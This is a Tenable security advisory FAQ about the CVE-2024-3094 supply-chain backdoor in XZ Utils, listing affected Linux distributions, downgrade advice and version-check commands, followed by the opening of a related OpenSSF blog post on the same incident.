    - [Research community](https://community.tenable.com/s/)
* Partners
  + #### Tenable partners
  + Find a partner
    - [Search resellers](/partner-locator/resellers)
    - [Search distributors](/partner-locator/distributors)
    - [Search MSSP](/partner-locator/mssp)
  + Tenable Assure partners
    - [Overview](/partners)
    - [Channel partner program](/partners/channel-partner-program)
    - [MSSP partner program](/partners/mssp-partner-program)
    - [Partner application](/partners/assure-program-application)
    - [Partner portal](https://partners.tenable.com/#/page/partner-login)
  + Other partner opportunities
    - [Technology ecosystem](/partners/technology)
    - [Research alliance program](/partners/research)
    - [Tenable performance marketing program](https://tenable.partnerstack.com/)
* Support
  + #### Tenable support
  + Support
    - [Technical support](/support)
    - [Tenable community](https://community.tenable.com/s/)
    - [Documentation](https://docs.tenable.com/)
  + Services
    - [Professional services](/services)
    - [Training and certification](/education)
    - [Buy certification](/buy/certification)
  + Tenable trust
    - [System status](https://status.tenable.com/)
    - [Security and compliance](/trust/assurance)
    - [Data protection](/gdpr-alignment)
* Company
  + #### About Tenable
  + About us
    - [About Tenable](/about-tenable/about-us)
    - [Leadership](/about-tenable/leadership)
    - [Investor relations](https://investors.tenable.com/)
    - [Tenable ventures](/tenable-ventures)
    - [Why choose Tenable](/why-tenable)
    - [Awards and recognition](/why-tenable#awards)
    - [Customer stories](/customers)
  + Media
    - [Press releases](/media#press-releases)
    - [Financial news releases](https://investors.tenable.com/news-releases)
    - [News](/media#news)
    - [Media kit](/media#kit)
  + Connect
    - [Contact us](/about-tenable/contact-tenable)
    - [Try our products](/try)
    - [Events](/events)
    - [Tenable community](https://community.tenable.com/s/)
    - [Subscribe to the blog](https://info.tenable.com/blog-subscription-page.html)
  + Join us
    - [Careers](/careers)
    - [Engagement and inclusion](/about-tenable/engagement-and-inclusion)
* Language
  + [English](https://www.tenable.com?tns_languageOverride=true)
  + [Deutsch](https://de.tenable.com?tns_languageOverride=true)
  + [Français (France)](https://fr.tenable.com?tns_languageOverride=true)
  + [Español (América Latina)](https://es-la.tenable.com?tns_languageOverride=true)
  + [Português (Brasil)](https://pt-br.tenable.com?tns_languageOverride=true)
  + [Italiano](https://it.tenable.com?tns_languageOverride=true)
  + [简体中文](https://www.tenablecloud.cn?tns_languageOverride=true)
  + [繁體中文](https://zh-tw.tenable.com?tns_languageOverride=true)
  + [日本語](https://jp.tenable.com?tns_languageOverride=true)
  + [한국어](https://kr.tenable.com?tns_languageOverride=true)
  + [العربية](https://ar.tenable.com?tns_languageOverride=true)

[Blog](/blog) / [Cyber Exposure Alerts](/blog/search?field_blog_section_tid=47)

[Subscribe](#blog-subscribe)

# Frequently Asked Questions About CVE-2024-3094, A Backdoor in XZ Utils

---

![Satnam Narang](/sites/default/files/pictures/2022-04/headshots-se7en_0.jpg)
[Satnam Narang](/profile/satnam-narang)

![Scott Caveza](/sites/default/files/img/users/picture-5714-1612876429.png)
[Scott Caveza](/profile/scott-caveza)

March 29, 2024
7 Min Read

* [![Twitter](/themes/custom/tenable/images-new/icons/twitter.svg "Twitter")](https://twitter.com/intent/tweet?text=Frequently%20Asked%20Questions%20About%20CVE-2024-3094%2C%20A%20Backdoor%20in%20XZ%20Utils%20https://www.tenable.com/blog/frequently-asked-questions-cve-2024-3094-supply-chain-backdoor-in-xz-utils)
* [![Facebook](/themes/custom/tenable/images-new/icons/facebook.svg "Facebook")](https://www.facebook.com/sharer/sharer.php?u=https://www.tenable.com/blog/frequently-asked-questions-cve-2024-3094-supply-chain-backdoor-in-xz-utils)
* [![LinkedIn](/themes/custom/tenable/images-new/icons/linkedin.svg "LinkedIn")](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tenable.com/blog/frequently-asked-questions-cve-2024-3094-supply-chain-backdoor-in-xz-utils&title=Frequently%20Asked%20Questions%20About%20CVE-2024-3094%2C%20A%20Backdoor%20in%20XZ%20Utils&summary=&source=)

---

![A blue gradient background with the Tenable Research logo located at the top center. Underneath is an orange rectangular shaped box with the words "ADVISORY" in. Underneath that box is white text that says "FREQUENTLY ASKED QUESTIONS." This blog is about a supply chain compromise involving the XZ Utils and identified as CVE-2024-3094.](/sites/default/files/images/articles/blog-tenable-research-advisory-high-FAQ_4.jpg)

**Frequently asked questions about CVE-2024-3094, a supply-chain attack responsible for a backdoor in XZ Utils, a widely used library found in multiple Linux distributions.**

**Update April 1:** The "What Linux distributions are affected?" section has been updated to include additional affected and not affected distributions. In addition, updates to the "Has Tenable released any product coverage for these vulnerabilities?" section have been made.

View Change Log

## Background

The Tenable Security Response Team has put together this blog to answer Frequently Asked Questions (FAQ) regarding CVE-2024-3094, a backdoor in XZ Utils, a widely used compression library found in multiple Linux distributions.

## FAQ

**What is XZ Utils and what is the library used for?**

XZ is a type of lossless data compression on Unix-like operating systems, which is often compared to other common data compression formats such as gzip and bzip2. XZ Utils is a command line tool that contains functionality for both compression and decompression of XZ files and [liblzma](https://xz.tukaani.org/xz-utils/liblzma-api/), a zlib-like API used for data compression and also supports the legacy .lzma format.

**How was this backdoor discovered?**

On March 29, Andres Freund, a PostgreSQL developer at Microsoft, posted on the [Open Source Security Mailing List](https://www.openwall.com/lists/oss-security/2024/03/29/4) that he had discovered a supply-chain compromise involving obfuscated malicious code in the XZ package while investigating SSH performance issues. According to both Freund and RedHat, the malicious code is not present in the Git distribution for XZ and only in the full download package.

**Which versions of the library are affected?**

According to Freund, XZ Utils versions 5.6.0 and 5.6.1 are impacted.

**Has this backdoor code been exploited?**

No information regarding exploitation has been observed for this backdoor code as of March 29. Because this situation is still developing, we anticipate more information will come to light in the coming days and weeks. We will update this portion of the FAQ once such information is available.

**What is the impact of this backdoor?**

According to Red Hat, the malicious code modifies functions within the liblzma code, which is part of the XZ Utils package. This modified code can then be used by any software linked to the XZ library and allow for the interception and modification of data used with the library. In the example observed by Freund, under certain conditions, this backdoor could allow a malicious actor to “break sshd authentication,” allowing the attacker to gain access to an affected system.

**Is there a CVE assigned for this issue?**

Yes, Red Hat assigned [CVE-2024-3094](https://www.tenable.com/cve/CVE-2024-3094) for this issue and it has been given a CVSSv3 score of 10.0.

**How was this backdoor inserted into the code?**

At the time this blog was published, it’s unclear how this backdoor code was placed into the affected builds of XZ utils. According to Freund, it's likely the individual who made the code commits is directly involved with the XZ project or had their system or developer account compromised.

**What Linux distributions are affected?**

As of the time this blog was published on March 29, the following distributions are known to be affected:

| **Distribution** | **Advisory** | **Notes** |
| --- | --- | --- |
| Fedora Rawhide | <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users> | Fedora Rawhide is the development distribution of Fedora Linux |
|
| Fedora 40 Beta | <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users> | Fedora Linux 40 beta does contain two affected versions of xz libraries, however does not appear to be affected. All Fedora 40 beta users are still encouraged to revert to 5.4.x versions of XZ. |
| Fedora 41 | <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users> |  |
| Debian testing, unstable and experimental distributions versions 5.5.1alpha-0.1 to 5.6.1-1. | <https://lists.debian.org/debian-security-announce/2024/msg00057.html>  <https://security-tracker.debian.org/tracker/CVE-2024-3094> |  |
| openSUSE Tumbleweed and openSUSE MicroOS | <https://news.opensuse.org/2024/03/29/xz-backdoor/> | Backdoored version of xz was included in Tumbelweed and MicroOS between March 7 and March 28 |
| Kali Linux | <https://www.kali.org/blog/about-the-xz-backdoor/> | Backdoored version of xz was included in Kali Linux (xz-utils 5.6.0-0.2) between March 26 and March 28 |
| Arch Linux | [https://archlinux.org/news/the-xz-package-has-been-backdoored//](https://archlinux.org/news/the-xz-package-has-been-backdoored/) | The following release artifacts contain the compromised xz:   * installation medium 2024.03.01 * virtual machine images 20240301.218094 and 20240315.221711 * container images created between and including 2024-02-24 and 2024-03-28 |

The following Linux distributions are confirmed to not be affected:

| **Distribution** | **Advisory** | **Notes** |
| --- | --- | --- |
| Fedora Linux 40 | <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users> | RedHat recommends that users downgrade to a 5.4 build of XZ as a precaution |
| Red Hat Enterprise Linux (RHEL) | <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users> | No versions of RHEL are affected. |
| Debian | <https://lists.debian.org/debian-security-announce/2024/msg00057.html> | No Debian **stable** versions are known to be affected. |
| Amazon Linux | <https://aws.amazon.com/security/security-bulletins/AWS-2024-002/> | Amazon Linux customers are not affected and AWS Infrastructure and services do not utilize xz. |
| SUSE Linux Enterprise and Leap | <https://news.opensuse.org/2024/03/29/xz-backdoor/> | Both Enterprise and Leap are isolated from OpenSUSE and are unaffected. |
| Alpine Linux | <https://twitter.com/alpinelinux/status/1773781993844519408> | No Alpine Linux xz binary is affected. |
| Gentoo Linux | <https://security.gentoo.org/glsa/202403-04> | Based on the current understanding of the backdoor, Gentoo is not affected. |
| Ubuntu | <https://ubuntu.com/security/CVE-2024-3094> | No released versions of Ubuntu are affected. |

Additionally, the macOS Homebrew package manager reverted its version of xz from 5.6.x to 5.4.6. Bo Anderson, a member of the technical steering committee and a maintainer of Homebrew, [confirmed](https://github.com/orgs/Homebrew/discussions/5243) that they do not believe Homebrew’s builds “were compromised” but because these versions of xz are not considered trustworthy, they have chosen to force downgrades “as a precaution.”

As this is a developing situation, we anticipate we will have further clarity for additional Linux distributions soon and will continue to update this blog as necessary.

**Are patches or mitigations available?**

Both developers and users of XZ Utils are advised to downgrade to known, unaffected versions of XZ Utils, such as 5.4.6 Stable. However, in addition to downgrading, it is strongly advised that developers and users conduct incident response to determine if they have been impacted as a result of this backdoor and to share “positive findings” with agencies like the Cybersecurity and Infrastructure Security Agency ([CISA](https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094)). You can check your installed version by running the command ***strings which xz` | egrep '\(XZ Utils\)*** or to determine if you have an affected version installed, you can run ***strings `which xz` | grep '5\.6\.[01]'***

![Example command line output to check which versions of XZ Utils and liblzma are installed.](https://www.tenable.com/sites/default/files/images/blog/xz_utils.jpg)

In the above image, our second command does not return a result as the affected version is not installed on this host.

**Has Tenable released any product coverage for these vulnerabilities?**

Tenable Research released product coverage on March 29 and additional coverage is expected to be released as its available. A list of Tenable plugins for this vulnerability can be found on the individual CVE page for [CVE-2024-3094](https://www.tenable.com/cve/CVE-2024-3094/plugins) as they’re released. This link will display all available plugins for this vulnerability, including upcoming plugins in our [Plugins Pipeline](https://www.tenable.com/plugins/pipeline).

### **Change Log**

**Update April 1:** The "What Linux distributions are affected?" section has been updated to include additional affected and not affected distributions. In addition, updates to the "Has Tenable released any product coverage for these vulnerabilities?" section have been made.

**Update March 29:** The "What Linux distributions are affected?" section has been updated to include additional affected and not affected distributions and a note about the Homebrew package manager.

### **Get more information**

* [Open Source Security Mailing List post by Andres Freund](https://www.openwall.com/lists/oss-security/2024/03/29/4)
* Red Hat: [Urgent security alert for Fedora Linux 40 and Fedora Rawhide users](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* Debian: [xz-utils security update](https://lists.debian.org/debian-security-announce/2024/msg00057.html)
* CISA Alert: [Reported Supply Chain Compromise Affecting XZ Utils Data Compression Library, CVE-2024-3094](https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094)

**Join** [**Tenable's Security Response Team**](https://community.tenable.com/s/group/0F9f2000000fyxyCAA/cyber-exposure-alerts) **on the Tenable Community.**
**Learn more about** [**Tenable One**](https://www.tenable.com/products/tenable-one)**, the Exposure Management Platform for the modern attack surface.**

---

![Satnam Narang](/sites/default/files/pictures/2022-04/headshots-se7en_0.jpg)
### [Satnam Narang](/profile/satnam-narang)

Satnam joined Tenable in 2018. He has over 15 years experience in the industry (M86 Security and Symantec). He contributed to the Anti-Phishing Working Group, helped develop a Social Networking Guide for the National Cyber Security Alliance, uncovered a huge spam botnet on Twitter and was the first to report on spam bots on Tinder. He's appeared on NBC Nightly News, Entertainment Tonight, Bloomberg West, and the Why Oh Why podcast.

**Interests outside of work:**Satnam writes poetry and makes hip-hop music. He enjoys live music, spending time with his three nieces, football and basketball, Bollywood movies and music and Grogu (Baby Yoda).

![Scott Caveza](/sites/default/files/img/users/picture-5714-1612876429.png)

### [Scott Caveza](/profile/scott-caveza)

Scott joined Tenable in 2012 as a Research Engineer on the Nessus Plugins team. Over the years, he has written hundreds of plugins for Nessus, and reviewed code for even more from his time being a team lead and manager of the Plugins team. Previously leading the Security Response team and the Zero Day Research team, Scott is currently a member of the Security Response team, helping the research organization respond to the latest threats. He has over a decade of experience in the industry with previous work in the Security Operations Center (SOC) for a major domain registrar and web hosting provider. Scott is a current CISSP and actively maintains his GIAC GWAPT Web Application Penetration Tester certification.

**Interests outside of work:** Scott enjoys spending time with his family, camping, fishing and being outdoors. He also enjoys finding ways to break web applications and home renovation projects.

## Related articles

*January 8, 2025*
## [CVE-2025-0282: Ivanti Connect Secure Zero-Day Vulnerability Exploited In The Wild](/blog/cve-2025-0282-ivanti-connect-secure-zero-day-vulnerability-exploited-in-the-wild)

Ivanti disclosed two vulnerabilities in its Connect Secure, Policy Secure and Neurons for ZTA gateway devices, including one flaw that was exploited in the wild as a zero-day....

---

*December 31, 2024*
## [Choosing the Right CNAPP: Six Considerations for Mid-Sized Enterprises](/blog/choosing-the-right-cnapp-six-considerations-for-mid-sized-enterprises)

Mid-sized enterprises increasingly find themselves in need of a CNAPP, as their cloud adoption matures. But how should they go about selecting the right one? What questions should they ask and what criteria should they use? Here we unpack six key considerations that’ll help them evaluate their optio...

---

*December 30, 2024*
## [Navigating the SEC’s Cybersecurity Disclosure Rules: One Year On](/blog/navigating-the-secs-cybersecurity-disclosure-rules-one-year-on)

In December 2023, as cyberattacks surged, the U.S. Securities and Exchange Commission (SEC)began enforcing new cybersecurity disclosure rules. This pushed C-level executives and boards to adopt measures for compliance and transparency. In this post, we look at the enforcement actions the SEC has tak...

---

* Exposure Management
* Vulnerability Management

* Exposure Management

* Tenable Lumin
* Tenable Nessus
* Tenable One
* Tenable Vulnerability Management
* Tenable Security Center
* Tenable Security Center Plus

### Cybersecurity news you can use

Enter your email and never miss timely alerts and security guidance from the experts at Tenable.

#### Thank you for subscribing!

[![Tenable logo](https://static.tenable.com/press/logos/TenableLogo_White_RGB.svg)](/)

---

### Featured products

* [Tenable One Exposure Management Platform](/products/tenable-one)
* [Tenable Cloud Security](/cloud-security)
* [Tenable CIEM](/cloud-security/products/cloud-infrastructure-entitlement-management)
* [Tenable Vulnerability Management](/products/vulnerability-management)
* [Tenable Web App Scanning](/products/web-app-scanning)
* [Tenable Patch Management](/products/patch-management)
* [Tenable Enclave Security](/products/enclave-security)
* [Tenable Attack Surface Management](/products/attack-surface-management)
* [Tenable Identity Exposure](/products/identity-exposure)
* [Tenable OT Security](/products/ot-security)
* [Tenable Security Center](/products/security-center)
* [Tenable Lumin](/products/tenable-lumin)
* [Tenable Nessus](/products/nessus)
* [View all](/products)

### Featured solutions

* [Active Directory](/solutions/active-directory)
* [Building management systems](/solutions/building-management-systems)
* [Cloud security posture management](/cloud-security/solutions/cspm)
* [Compliance](/solutions/compliance)
* [Exposure management](/exposure-management)
* [Finance](/solutions/finance)
* [General manufacturing](/solutions/general-manufacturing)
* [Generative AI](/solutions/exposure-ai)
* [Healthcare](/solutions/healthcare)
* [Hybrid cloud security](/cloud-security/solutions/hybrid-cloud)
* [IT/OT](/solutions/it-ot)
* [Ransomware](/solutions/ransomware)
* [State / Local / Education](/solutions/sled)
* [US federal](/solutions/government/us-fed)
* [Vulnerability management](/solutions/vulnerability-management)
* [Zero trust](/solutions/zero-trust)
* [View all](/solutions)

### Customer resources

* [Resource library](/resources)
* [Community & support](https://community.tenable.com/login)
* [Customer education](/education)
* [Tenable Research](/research)
* [Documentation](https://docs.tenable.com/)
* [Nessus resource center](/nessus/resource-center)
* [Cybersecurity guide](/cybersecurity-guide)
* [Why Tenable](/why-tenable)
* [Trust](/trust)
* [System status](https://status.tenable.com/)

### Connections

* [Blog](/blog)
* [Contact us](/about-tenable/contact-tenable)
* [Careers](/careers)
* [Investors](https://investors.tenable.com)
* [Tenable Ventures](/tenable-ventures)
* [Events](/events)
* [Media](/media)

---

* [Privacy policy](/privacy-policy)
* [Do not sell/share my personal information](/privacy-policy/#california-rights)
* [Legal](/legal)
* [508 compliance](/section-508-voluntary-product-accessibility)

© 2025 Tenable®, Inc. All rights reserved

[![Linkedin](https://static.tenable.com/marketing/icons/social/PNG/footer-icon-linkedin-white.png)](https://www.linkedin.com/company/tenableinc/)
[![Twitter](https://static.tenable.com/marketing/icons/social/PNG/footer-icon-twitter-white.png)](https://twitter.com/tenablesecurity)
[![Youtube](https://static.tenable.com/marketing/icons/social/PNG/footer-icon-youtube-white.png)](https://www.youtube.com/channel/UCX_67IPEhqyYF9ppVRAcAwQ)
[![Instagram](https://static.tenable.com/marketing/icons/social/PNG/instagram-no-circle-white.png)](https://www.instagram.com/tenableofficial/)
[![Facebook](https://static.tenable.com/marketing/icons/social/PNG/footer-icon-facebook-white.png)](https://www.facebook.com/Tenable.Inc)

Try for free
Buy now

### Tenable Vulnerability Management

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy.

Your Tenable Vulnerability Management trial also includes Tenable Lumin and Tenable Web App Scanning.

### Tenable Vulnerability Management

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy. **Purchase your annual subscription today.**

-
100 assets
+

Choose your subscription option:

1 Year
**$3,500**

2 Years
**$6,825**

3 Years
**$9,975**

[Buy Now](https://store.tenable.com/1479/purl-tiotwoyear?quantity=100&x-promotion=webmodal-io&x-Source=Modal)

Please contact us or a [Tenable partner.](https://www.tenable.com/partner-locator/resellers)

### Thank You

Thank you for your interest in Tenable Vulnerability Management. A representative will be in touch soon.

Try for free
Buy now

#### Tenable Vulnerability Management

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy.

Your Tenable Vulnerability Management trial also includes Tenable Lumin and Tenable Web App Scanning.

#### Tenable Vulnerability Management

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy. **Purchase your annual subscription today.**

-
100 assets
+

Choose your subscription option:

1 Year
**$3,500**

2 Years
**$6,825**

3 Years
**$9,975**

[Buy Now](https://store.tenable.com/1479/purl-tiotwoyear?quantity=100&x-promotion=webmodal-io&x-Source=Modal)

Please contact us or a [Tenable partner.](https://www.tenable.com/partner-locator/resellers)

### Thank you

Thank you for your interest in Tenable.io. A representative will be in touch soon.

Try for free
Buy now

#### Tenable Vulnerability Management

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy.

Your Tenable Vulnerability Management trial also includes Tenable Lumin and Tenable Web App Scanning.

#### Tenable Vulnerability Management

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy. **Purchase your annual subscription today.**

-
100 assets
+

Choose your subscription option:

1 Year
**$3,500**

2 Years
**$6,825**

3 Years
**$9,975**

[Buy Now](https://store.tenable.com/1479/purl-tiotwoyear?quantity=100&x-promotion=webmodal-io&x-Source=Modal)

Please contact us or a [Tenable partner.](https://www.tenable.com/partner-locator/resellers)

### Thank you

Thank you for your interest in Tenable Vulnerability Management. A representative will be in touch soon.

Try for free
Buy now

#### Try Tenable Web App Scanning

Enjoy full access to our latest web application scanning offering designed for modern applications as part of the Tenable One Exposure Management platform. Safely scan your entire online portfolio for vulnerabilities with a high degree of accuracy without heavy manual effort or disruption to critical web applications. **Sign up now.**

Your Tenable Web App Scanning trial also includes Tenable Vulnerability Management and Tenable Lumin.

#### Buy Tenable Web App Scanning

Enjoy full access to a modern, cloud-based vulnerability management platform that enables you to see and track all of your assets with unmatched accuracy. **Purchase your annual subscription today.**

-
5 FQDNs
+

**$3,578**

[Buy Now](https://store.tenable.com/1479/?scope=checkout&cart=202710?x-promotion=webmodal-was&x-Source=Modal)

Please contact us or a [Tenable partner.](https://www.tenable.com/partner-locator/resellers)

### Thank you

Thank you for your interest in Tenable Web App Scanning. A representative will be in touch soon.

Try for free
Contact sales

#### Try Tenable Lumin

Visualize and explore your exposure management, track risk reduction over time and benchmark against your peers with Tenable Lumin.

Your Tenable Lumin trial also includes Tenable Vulnerability Management and Tenable Web App Scanning.

#### Buy Tenable Lumin

Contact a sales representative to see how Tenable Lumin can help you gain insight across your entire organization and manage cyber risk.

### Thank you

Thank you for your interest in Tenable Lumin. A representative will be in touch soon.

### Request a demo of Tenable Security Center

Please fill out this form with your contact information.

A sales representative will contact you shortly to schedule a demo.

*\* Field is required*

### Request a demo of Tenable OT Security

Get the Operational Technology security you need.

Reduce the risk you don’t.

### Request a demo of Tenable Identity Exposure

Continuously detect and respond to Active Directory attacks. No agents. No
privileges.

On-prem and in the cloud.

### Request a demo of Tenable Cloud Security

---

**Exceptional unified cloud security awaits you!**

---

We’ll show you exactly how Tenable Cloud Security helps you deliver multi-cloud asset discovery, prioritized risk assessments and automated compliance/audit reports.

### See Tenable One in action

Exposure management for the modern attack surface.

### See Tenable Attack Surface Management in action

Know the exposure of every asset on any platform.

### Get a demo of Tenable Enclave Security

Please fill out the form with your contact information and a sales representative will contact you shortly to schedule a demo.

### Thank You

Thank you for your interest in Tenable Enclave Security. A representative will be in touch soon.

Try for free
Buy now

#### Try Tenable Nessus Professional free

Free for 7 days

Tenable Nessus is the most comprehensive vulnerability scanner on the market today.

#### NEW - Tenable Nessus Expert now available

Nessus Expert adds even more features, including external attack surface scanning, and the ability to add domains and scan cloud infrastructure. **[Click here to Try Nessus Expert.](/products/nessus/nessus-expert/evaluate?utm_source=tenable-com&utm_medium=modal&utm_campaign=try-nessus-pro-upsell)**

Fill out the form below to continue with a Nessus Pro trial.

#### Buy Tenable Nessus Professional

Tenable Nessus is the most comprehensive vulnerability scanner on the market today. Tenable Nessus Professional will help automate the vulnerability scanning process, save time in your compliance cycles and allow you to engage your IT team.

Buy a multi-year license and save. Add Advanced Support for access to phone, community and chat support 24 hours a day, 365 days a year.

**Select your license**

Buy a multi-year license and save.

1 Year - $3,990\*

2 Years - $7,780.50\*Save

3 Years - $11,371.50\*Save

**Add support and training**

**Advanced Support - $400**

24x365 Access to phone, email, community, and chat support. [More info](/products/nessus/nessus-professional/advanced-support).

**On-Demand Training - $275**

1 Year Access to the Nessus Fundamentals On-Demand Video Course for 1 person. [More info](/education/courses/nessus-fundamentals?utm_source=tenable-com&utm_medium=pro-modal-buy&utm_campaign=more-info).

[Buy Now](https://store.tenable.com/1479/purl-webNessusOneYearBundle_Support?x-promotion=webmodal-nessus&x-Source=Modal)
[Renew an existing license](https://community.tenable.com/s/products)
[Find a reseller](/partner-locator/resellers)

\*VAT incl.

Try for free
Buy now

#### Try Tenable Nessus Expert free

Free for 7 days.

Built for the modern attack surface, Nessus Expert enables you to see more and protect your organization from vulnerabilities from IT to the cloud.

**Already have Tenable Nessus Professional?**  [Upgrade to Nessus Expert free for 7 days.](/products/nessus/nessus-expert/evaluate/upgrade)

#### Buy Tenable Nessus Expert

Built for the modern attack surface, Nessus Expert enables you to see more and protect your organization from vulnerabilities from IT to the cloud.

**Select your license**

*Buy a multi-year license and save more.*

**1 Year** - $5,990\*Save

**2 Years** - $11,680.50\*Save

**3 Years** - $17,071.50\*Save

**Add support and training**

**Advanced Support - $400**

24x365 Access to phone, email, community, and chat support. [More info](/products/nessus/advanced-support).

**Nessus Fundamentals - $275**

1 Year Access to the Nessus Fundamentals On-Demand Video Course for 1 person. [More info.](/education/courses/nessus-fundamentals?utm_source=tenable-com&utm_medium=expert-modal-buy&utm_campaign=more-info)

**Nessus Fundamentals + Nessus Advanced - $385**

1 Year Access to the Nessus Fundamentals and Nessus Advanced On-Demand Video Courses for 1 person. [More info.](/education/courses/nessus-advanced?utm_source=tenable-com&utm_medium=pro-buypage-embed&utm_campaign=more-info)

[Buy Now](https://store.tenable.com/1479/purl-webExpertOneYearOptin?x-promotion=webmodal-expert&x-Source=Modal)
[Renew an existing license](https://community.tenable.com/s/products)
[Find a reseller](/partner-locator/resellers)

#### Learn How Tenable Helps Achieve SLCGP Cybersecurity Plan Requirements

Tenable solutions help fulfill all SLCGP requirements. Connect with a Tenable representative to learn more.

**Thank you.**

You should receive a confirmation email shortly and one of our Sales Development Representatives will be in touch. Route any questions to [[email protected]](/cdn-cgi/l/email-protection#bdeef1fefaedfdc9d8d3dcdfd1d893ded2d0).

### Get a demo of Tenable Patch Management

Interested in streamlining security and IT collaboration and shortening the mean time to remediate with automation? Try Tenable Patch Management.



=== Content from openssf.org_4a6039b6_20250111_034034.html ===

[Skip to main content](#ajax-content-wrap)

📩 Stay Updated! Follow us on **[LinkedIn](https://www.linkedin.com/company/openssf/)** and join our **[mailing list](https://openssf.org/sign-up/)** for the latest news!

[![Open Source Security Foundation](https://openssf.org/wp-content/uploads/2023/12/Open-SSF-Logo-horizontal-colorwhite.svg)](https://openssf.org)

[search](#searchbox)
 [Menu](#sidewidgetarea)

* [About](https://openssf.org/about/)
  + [About OpenSSF](https://openssf.org/about/)
    - [Governing Board](https://openssf.org/about/board/)
    - [Technical Advisory Council](https://openssf.org/about/tac/)
    - [Staff](https://openssf.org/about/staff/)
    - [Charter](https://openssf.org/about/charter/)
    - [Antitrust Policy](https://www.linuxfoundation.org/legal/antitrust-policy)
    - [Brand Guidelines](https://openssf.org/about/brand-guidelines/)
  + [Contact Us](https://openssf.org/about/contact/)
  + [Members](https://openssf.org/about/members/)
* Contributors
  + [Get Involved](https://openssf.org/getinvolved/)
  + [Slack](https://slack.openssf.org)
  + [Working Groups](https://openssf.org/community/openssf-working-groups/)
  + [OpenSSF GitHub](https://github.com/ossf)
  + [Jobs Board](https://openssf.jobboard.io/)
  + [Swag Store](https://openssf.myspreadshop.com/)
  + [Code of Conduct](https://openssf.org/community/code-of-conduct/)
* Technical Initiatives
  + [Projects](https://openssf.org/projects/)
  + [Tech Talks](https://openssf.org/resources/tech-talks/)
  + [For Developers](https://best.openssf.org/developers)
* [Training & Guides](https://openssf.org/training)
  + [Certification: Secure Software Fundamentals](https://openssf.org/training/courses/)
  + [Training: Using Scorecard](https://openssf.org/training/securing-projects-with-openssf-scorecard-course/)
  + [Training: Using Sigstore](https://openssf.org/training/securing-your-software-supply-chain-with-sigstore-course/)
  + [Comprehensive Security Guides](https://openssf.org/resources/guides/)
* [Blog & Resources](https://openssf.org/blog/)
  + [Blogs](https://openssf.org/blog/)
    - [Submit a Blog](https://openssf.org/community/blog-guidelines/)
  + [Podcast 🎤](https://openssf.org/podcast/)
  + [Case Studies](https://openssf.org/case-studies/)
  + [Newsletter](https://openssf.org/newsletter/)
  + [Press Releases](https://openssf.org/news/)
  + [Reports](https://openssf.org/resources/publications/)
* [Events](https://openssf.org/events/)
  + [Global OpenSSF Events Calendar](https://openssf.org/events/)
    - [All Linux Foundation Events](https://events.linuxfoundation.org/)
  + [Virtual Town Halls](https://openssf.org/townhalls/)
  + [Guidelines for Meetups](https://openssf.org/community/meetup-guidelines/)
* [Join](https://openssf.org/join/)

* [search](#searchbox)

*Press enter to begin your search*

Close Search

# xz Backdoor CVE-2024-3094

By [OpenSSF](https://openssf.org/author/openssf/ "Posts by OpenSSF")March 30, 2024April 3rd, 2024[Blog](https://openssf.org/category/blog/)
 [No Comments](https://openssf.org/blog/2024/03/30/xz-backdoor-cve-2024-3094/#respond)

![xz Backdoor CVE-2024-3094](https://openssf.org/wp-content/uploads/2024/03/OpenSSF-Blog-Graphics-1.png)

By Omkhar Arasaratnam, General Manager, OpenSSF; Bennett Pursell, Ecosystem Strategist, OpenSSF; Harry Toor, Chief of Staff, OpenSSF; Christopher “CRob” Robinson, OpenSSF TAC Chair & Director of Security Communications, Intel

[CVE-2024-3094](https://www.cve.org/CVERecord?id=CVE-2024-3094) documents a backdoor in the xz package. This backdoor was inserted by an actor with the intent to include an obfuscated backdoor into the software. While the motivation behind this backdoor remains unknown, the intent was to compromise specific distributions, as the backdoors were only applied to DEB or RPM packages for the x86-64 architecture built with gcc and the gnu linker.

## The Vulnerability in XZ Utils

A [backdoor in upstream xz/liblzma](https://www.openwall.com/lists/oss-security/2024/03/29/4) was announced on the [oss-security mailing list](https://www.openwall.com/lists/oss-security/) regarding the xz compression tools and libraries. Specifically, the issue with the xz libraries are with version 5.6.0 and 5.6.1, and users are urged to immediately stop usage and downgrade to xz-5.4.x.

This vulnerability in XZ Utils – the XZ format compression utilities included in most Linux distributions – may “enable a malicious actor to break sshd authentication and gain unauthorized access to the entire system remotely,” Red Hat warns. However, they note “Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by Linux distributions, and where they have, mostly in pre-release versions.”

The author intentionally obfuscated the backdoor in distribution tarballs, intended for Linux distributions to use for building their packages. When the xz build system is instructed to create an RPM or DEB for the x86-64 architecture using gcc and gnu linker, the backdoor is included in the liblzma as part of the build process. This backdoor is then shipped as part of the binary within the RPM or DEB.

Other distributions are also likely affected by this if bleeding-edge versions are used. SUSE has published a [downgrade procedure](https://build.opensuse.org/request/show/1163302) for those running openSUSE. [Debian says](https://lists.debian.org/debian-security-announce/2024/msg00057.html) that stable versions are unaffected, but those using the testing, unstable, and experimental distributions may be affected.

## Threats in the Open Source Software Supply Chain

Threats to open source software can affect any part of the supply chain. In this case, a nefarious or compromised maintainer appears to have inserted malicious code into the package. The nature of open source software allowed this vulnerability to be discovered, reported, and addressed in a short period of time due to the diligence and oversight of the community.

